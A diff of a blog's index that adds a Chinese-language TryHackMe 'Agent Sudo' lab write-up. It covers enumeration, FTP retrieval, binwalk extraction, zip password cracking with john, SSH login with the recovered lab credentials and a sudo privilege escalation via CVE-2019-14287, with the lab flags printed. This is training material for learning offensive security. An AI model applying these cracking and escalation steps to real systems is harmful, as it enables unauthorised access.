class="line">使用或任何类似的工具，尝试找出绑匪拍摄其附加到文档中的图像的地点。街道的名称是什么？exiftool</span><br></pre></td></tr></table></figure>
-<p>这边给了例题，主要就是查找基本的exif信息，除了上述给出的工具，直接用010手撸都行，最简单的misc</p>
 ]]></content>
       <categories>
         <category>Tryhackme</category>
@@ -2488,6 +2488,115 @@ FFI是PHP中调用C代码的手段
 <p>在这里找到相关的提权方式</p>
 <p><img src="https://s2.loli.net/2024/02/27/tPw5OLoF8iXcBaA.png" alt="Tryhackme_4_4"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Tryhackme</category>
+      </categories>
+      <tags>
+        <tag>Tryhackme</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tryhackme_Diary-5</title>
+    <url>/2024/03/05/Tryhackme_Diary-5/</url>
+    <content><![CDATA[<h1>Tryhackme_Diary-5</h1>
+<h2 id="Agent-Sudo">Agent Sudo</h2>
+<h3 id="Enumerate">Enumerate</h3>
+<ol>
+<li>
+<p>How many open ports?</p>
+<p>可能是因为网络延迟的问题，导致开始的时候一个端口都没扫描出来，延时可以适当开高一点点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/03/05/pV4LatyfSXNCl35.png" alt="Tryhackme_5_1"></p>
+</li>
+<li>
+<p>How you redirect yourself to a secret page?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user-agent</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/03/05/OlMXjakTzYwE74N.png" alt="Tryhackme_5_2"></p>
+</li>
+<li>
+<p>What is the agent name?</p>
+<p>user-agent参数为C的时候，可以收到回复</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Attention chris,</span><br><span class="line"></span><br><span class="line">Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!</span><br><span class="line"></span><br><span class="line">From,</span><br><span class="line">Agent R</span><br></pre></td></tr></table></figure>
+<p>因此可以获取本题的答案是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chris</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Hash-cracking-and-brute-force">Hash cracking and brute-force</h3>
+<p>FTP password</p>
+<ol>
+<li>
+<p>FTP password</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crystal</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/03/05/LI6Zid3JzXKVAYE.png" alt="Tryhackme_5_3"></p>
+</li>
+<li>
+<p>Zip file password</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||57590|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt</span><br><span class="line">-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg</span><br><span class="line">-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; mget *</span><br><span class="line">mget To_agentJ.txt [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||37193|)</span><br><span class="line">150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).</span><br><span class="line">100% |*************************************************************************************************************|   217       53.09 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">217 bytes received in 00:00 (0.75 KiB/s)</span><br><span class="line">mget cute-alien.jpg [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||42821|)</span><br><span class="line">150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).</span><br><span class="line">100% |*************************************************************************************************************| 33143      113.24 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">33143 bytes received in 00:00 (57.12 KiB/s)</span><br><span class="line">mget cutie.png [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||18497|)</span><br><span class="line">150 Opening BINARY mode data connection for cutie.png (34842 bytes).</span><br><span class="line">100% |*************************************************************************************************************| 34842       60.41 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">34842 bytes received in 00:00 (40.51 KiB/s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>ftp登录之后将文件进行下载，然后寻找相关线索</p>
+<p>将图片分析后发现存在一个压缩包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ binwalk -e cutie.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced</span><br><span class="line">869           0x365           Zlib compressed data, best compression</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor &#x27;jar xvf &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;jar&#x27;, &#x27;jar xvf &#x27;%e&#x27;&#x27; might not be installed correctly</span><br><span class="line">34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt</span><br><span class="line">34820         0x8804          End of Zip archive, footer length: 22</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>分离开后确实有密码，开始爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面/_cutie.png.extracted]</span><br><span class="line">└─$ john hash                                             </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])</span><br><span class="line">Cost 1 (HMAC size) is 78 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">alien            (8702.zip/To_agentR.txt)     </span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2024-03-05 01:33) 1.315g/s 58478p/s 58478c/s 58478C/s 123456..Peter</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alien</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>steg password</p>
+<p>解压上述压缩包后我们得到一段信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Agent C,</span><br><span class="line">We need to send the picture to &#x27;QXJlYTUx&#x27; as soon as possible!</span><br><span class="line">By,</span><br><span class="line">Agent R</span><br></pre></td></tr></table></figure>
+<p>base64后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Area51</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>Who is the other agent (in full name)?</p>
+<p>从cute-alien.jpg中提取数据，然后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi james,</span><br><span class="line"></span><br><span class="line">Glad you find this message. Your login password is hackerrules!</span><br><span class="line"></span><br><span class="line">Don&#x27;t ask me why the password look cheesy, ask agent R who set this password for you.</span><br><span class="line"></span><br><span class="line">Your buddy,</span><br><span class="line">chris</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>SSH password</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hackerrules</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Capture-the-user-flag">Capture the user flag</h3>
+<ol>
+<li>
+<p>What is the user flag?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ^[[200~ssh james@10.10.212.207   ~</span><br><span class="line">zsh: bad pattern: ^[[200~ssh</span><br><span class="line">                                                                                                                                                          </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ssh james@10.10.212.207   </span><br><span class="line">The authenticity of host &#x27;10.10.212.207 (10.10.212.207)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.</span><br><span class="line">This host key is known by the following other names/addresses:</span><br><span class="line">    ~/.ssh/known_hosts:1: [hashed name]</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.212.207&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">james@10.10.212.207&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"> System information disabled due to load higher than 1.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">75 packages can be updated.</span><br><span class="line">33 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Oct 29 14:26:27 2019</span><br><span class="line">james@agent-sudo:~$ ls</span><br><span class="line">Alien_autospy.jpg  user_flag.txt</span><br><span class="line">james@agent-sudo:~$ cat user_flag.txt </span><br><span class="line">b03d975e8c92a7c04146cfa7a5a313c7</span><br></pre></td></tr></table></figure>
+<p>因此可以得到本题的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b03d975e8c92a7c04146cfa7a5a313c7</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>What is the incident of the photo called?</p>
+<p>在该文件下还发现存在一个图片，传输至本地查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo scp james@10.10.212.207:Alien_autospy.jpg ~/</span><br></pre></td></tr></table></figure>
+<p>尝试传输发现权限不足</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, user james is not allowed to execute &#x27;/usr/bin/scp james@10.10.212.207:Alien_autospy.jpg /home/james/&#x27; as root on agent-sudo.</span><br></pre></td></tr></table></figure>
+<p>枚举一下权限组信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">james@agent-sudo:~$ sudo -l</span><br><span class="line">[sudo] password for james: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for james: </span><br><span class="line">Matching Defaults entries for james on agent-sudo:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on agent-sudo:</span><br><span class="line">    (ALL, !root) /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>提权步骤看下面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Roswell alien autopsy</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="Privilege-escalation">Privilege escalation</h3>
+<ol>
+<li>
+<p>CVE number for the escalation</p>
+<p>查询关键词</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ALL, !root) /bin/bash</span><br></pre></td></tr></table></figure>
+<p>发现存在漏洞<a href="https://www.exploit-db.com/exploits/47502">sudo 1.8.27 - Security Bypass - Linux local Exploit (exploit-db.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-14287</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>What is the root flag?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@agent-sudo:/root# ls</span><br><span class="line">root.txt</span><br><span class="line">root@agent-sudo:/root# cat root.txt </span><br><span class="line">To Mr.hacker,</span><br><span class="line"></span><br><span class="line">Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. </span><br><span class="line"></span><br><span class="line">Your flag is </span><br><span class="line">b53a02f55b57d4439e3341834d70c062</span><br><span class="line"></span><br><span class="line">By,</span><br><span class="line">DesKel a.k.a Agent R</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>(Bonus) Who is Agent R?</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DesKel</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="https://s2.loli.net/2024/03/05/vhJLdnYr8VDmCqj.png" alt="Tryhackme_5_4"></p>
 ]]></content>
       <categories>
         <category>Tryhackme</category>
